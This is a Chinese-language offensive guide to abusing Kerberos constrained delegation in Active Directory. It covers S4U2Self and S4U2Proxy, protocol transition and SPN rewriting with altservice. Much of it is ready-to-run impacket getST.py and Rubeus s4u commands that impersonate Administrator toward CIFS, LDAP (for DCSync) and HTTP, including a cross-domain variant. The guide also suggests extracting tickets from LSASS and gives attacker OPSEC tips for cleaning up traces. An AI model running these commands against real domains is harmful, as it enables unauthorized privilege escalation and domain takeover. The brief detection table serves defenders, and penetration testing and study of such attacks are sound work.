# 约束委派攻击详解

## S4U2Self + S4U2Proxy 协议机制

### S4U2Self (Service for User to Self)

服务账号代表任意用户向 KDC 请求一张 "该用户访问本服务" 的 Service Ticket。此过程不需要用户的凭据或实际参与。

**请求**: 服务 A 向 KDC 声明 "用户 X 正在访问我，请给我一张票据"
**响应**: KDC 返回一张 User X → Service A 的 ST

关键点:
- 如果服务 A 设置了 `TRUSTED_TO_AUTH_FOR_DELEGATION`，返回的 ST 带有 Forwardable 标志
- 如果没有该标志，返回的 ST 不可转发，无法直接用于 S4U2Proxy

### S4U2Proxy (Service for User to Proxy)

服务 A 使用 S4U2Self 获取的 ST 作为 "evidence"，向 KDC 请求一张 "该用户访问目标服务 B" 的 ST。

**请求**: 服务 A 提交 User X → Service A 的 ST，请求 User X → Service B 的 ST
**响应**: KDC 验证委派配置后返回 User X → Service B 的 ST

关键点:
- KDC 检查 `msDS-AllowedToDelegateTo` 中是否包含 Service B
- 需要 evidence 票据带有 Forwardable 标志 (有协议转换时)
- 返回的 ST 可直接用于访问目标服务

### 完整流程

```
攻击者控制 ServiceA (有约束委派配置)
    │
    ├─ Step 1: S4U2Self
    │   请求: ServiceA → KDC "为 Administrator 生成访问 ServiceA 的 ST"
    │   响应: KDC → ServiceA  ST(Administrator → ServiceA) [Forwardable]
    │
    ├─ Step 2: S4U2Proxy
    │   请求: ServiceA → KDC "用此 ST 为 Administrator 请求访问 TargetService"
    │   响应: KDC → ServiceA  ST(Administrator → TargetService)
    │
    └─ Step 3: 使用 ST 访问目标
        ServiceA → TargetService (以 Administrator 身份)
```

---

## 有协议转换 vs 无协议转换

### 有协议转换 (TrustedToAuthForDelegation)

**UAC 标志**: `TRUSTED_TO_AUTH_FOR_DELEGATION` (0x1000000 / 16777216)

特征:
- S4U2Self 返回可转发票据 (Forwardable=1)
- 可直接链接 S4U2Proxy
- 不需要用户实际认证
- findDelegation.py 输出: `Constrained w/ Protocol Transition`

```bash
# 检查是否有协议转换
# UAC 值包含 16777216 = 有协议转换
python3 -c "print(bool(<UAC_VALUE> & 0x1000000))"
```

### 无协议转换

特征:
- S4U2Self 返回不可转发票据 (Forwardable=0)
- 不能直接用于 S4U2Proxy
- findDelegation.py 输出: `Constrained`
- 需要额外手段获取可转发票据

**绕过方法**:

```
方法 1: 结合 RBCD
├─ 在服务账号自身配置 RBCD
├─ 通过 RBCD 路径获取可转发 ST
└─ 使用该 ST 进行 S4U2Proxy

方法 2: 捕获用户票据
├─ 等待/诱导目标用户对服务认证
├─ 从 LSASS 提取该用户的可转发 ST
└─ 使用该 ST 进行 S4U2Proxy
```

---

## altservice 技巧

### 原理

Kerberos ST 中的 sname (服务名) 字段不在 KDC 签名的 PAC 范围内。攻击者获取 ST 后，可以修改 sname 从而访问同一主机上的其他服务。

例如: 约束委派目标是 `time/dc01.domain.local`，可改写为:
- `cifs/dc01.domain.local` — SMB 文件共享
- `ldap/dc01.domain.local` — LDAP 访问 (可 DCSync)
- `http/dc01.domain.local` — HTTP/WinRM
- `host/dc01.domain.local` — WMI/PSRemoting

### impacket getST.py 用法

```bash
# 直接指定想要的 SPN (impacket 会自动处理)
getST.py -spn cifs/<TARGET_FQDN> -impersonate Administrator \
  <DOMAIN>/<SERVICE_ACCOUNT>:<PASSWORD>

# 使用 -altservice 显式替换
getST.py -spn time/<TARGET_FQDN> -impersonate Administrator \
  -altservice cifs <DOMAIN>/<SERVICE_ACCOUNT>:<PASSWORD>

# 请求多个替代服务
getST.py -spn time/<TARGET_FQDN> -impersonate Administrator \
  -altservice cifs,ldap,http <DOMAIN>/<SERVICE_ACCOUNT>:<PASSWORD>
```

### Rubeus 用法

```powershell
# 单个替代服务
Rubeus.exe s4u /user:<SERVICE_ACCOUNT> /rc4:<NT_HASH> /impersonateuser:Administrator /msdsspn:time/<TARGET_FQDN> /altservice:cifs /ptt

# 多个替代服务
Rubeus.exe s4u /user:<SERVICE_ACCOUNT> /rc4:<NT_HASH> /impersonateuser:Administrator /msdsspn:time/<TARGET_FQDN> /altservice:cifs,ldap,http /nowrap
```

### 限制条件

- 目标服务必须运行在同一机器账号下 (通常 DC 上所有服务都以 DC$ 运行)
- 某些服务启用了额外校验 (如 LDAP Channel Binding)
- 修改后的 SPN 必须是目标主机实际监听的服务

---

## impacket getST.py 参数详解

```bash
getST.py [-h]
  -spn SPN                    # 目标 SPN (例: cifs/target.domain.local)
  -impersonate USER           # 要模拟的用户 (例: Administrator)
  -altservice SERVICE         # 替代服务名 (例: cifs,ldap)
  -dc-ip DC_IP                # DC 的 IP 地址
  -hashes LMHASH:NTHASH      # NTLM Hash (例: :aad3b435...)
  -aesKey AES_KEY             # AES256 密钥
  -k                          # 使用 Kerberos 认证
  -no-pass                    # 不提示密码
  -ts                         # 显示时间戳
  DOMAIN/USER[:PASSWORD]      # 服务账号凭据
```

常用组合:

```bash
# 明文密码
getST.py -spn cifs/target.domain.local -impersonate Administrator \
  domain.local/svc_account:Password123

# NTLM Hash
getST.py -spn cifs/target.domain.local -impersonate Administrator \
  -hashes :a87f3a337d73085c45f9416be5787d86 domain.local/svc_account

# AES256 Key
getST.py -spn cifs/target.domain.local -impersonate Administrator \
  -aesKey 4a3d8f... domain.local/svc_account

# 完整参数
getST.py -spn cifs/target.domain.local -impersonate Administrator \
  -altservice ldap -dc-ip 192.168.1.1 -ts domain.local/svc_account:Password123
```

---

## Rubeus s4u 用法

```powershell
# 基本 S4U (使用 RC4/NTLM)
Rubeus.exe s4u /user:<ACCOUNT> /rc4:<HASH> /impersonateuser:Administrator /msdsspn:cifs/<TARGET> /ptt

# 使用 AES256
Rubeus.exe s4u /user:<ACCOUNT> /aes256:<KEY> /impersonateuser:Administrator /msdsspn:cifs/<TARGET> /ptt

# 使用 Base64 TGT
Rubeus.exe s4u /ticket:<BASE64_TGT> /impersonateuser:Administrator /msdsspn:cifs/<TARGET> /ptt

# 指定域和 DC
Rubeus.exe s4u /user:<ACCOUNT> /rc4:<HASH> /impersonateuser:Administrator /msdsspn:cifs/<TARGET> /domain:<DOMAIN> /dc:<DC_FQDN> /ptt

# 输出 Base64 而非 PTT
Rubeus.exe s4u /user:<ACCOUNT> /rc4:<HASH> /impersonateuser:Administrator /msdsspn:cifs/<TARGET> /nowrap

# altservice
Rubeus.exe s4u /user:<ACCOUNT> /rc4:<HASH> /impersonateuser:Administrator /msdsspn:time/<TARGET> /altservice:cifs,ldap /nowrap
```

---

## 跨域约束委派

当约束委派配置跨域时 (例如 child.domain.local 的服务委派到 domain.local 的服务)，攻击流程基本相同，但需注意:

### 关键差异

1. S4U2Self 在服务所在域完成
2. S4U2Proxy 需要跨域 referral 票据
3. 需要指定正确的 DC

```bash
# 跨域 S4U
getST.py -spn cifs/target.parent.local -impersonate Administrator \
  -dc-ip <CHILD_DC_IP> child.parent.local/svc_account:Password123

# impacket 会自动处理跨域 referral
```

### 限制

- 跨林 (cross-forest) 约束委派已在 2019 年补丁中默认禁用
- 域内和域间 (cross-domain within forest) 仍可利用
- 检查 `msDS-AllowedToDelegateTo` 中的 SPN 是否包含其他域的主机

---

## OPSEC 与检测

### 检测指标

| 事件 | Event ID | 说明 |
|------|----------|------|
| S4U2Self | 4769 | 服务账号为其他用户请求 ST，Ticket Options 含 S4U |
| S4U2Proxy | 4769 | Transited Services 字段非空 |
| 票据请求 | 4768 | 服务账号的 TGT 请求 |

### 攻击方注意事项

- getST.py 的票据默认保存为 `<impersonated_user>.ccache`，操作后及时清理
- Rubeus s4u 在目标和 DC 上均留下 4769 日志
- altservice 修改不会在日志中体现原始 SPN
- 票据有效期通常 10 小时，续期最长 7 天
- Protected Users 组成员和标记 "Account is sensitive" 的用户无法被模拟
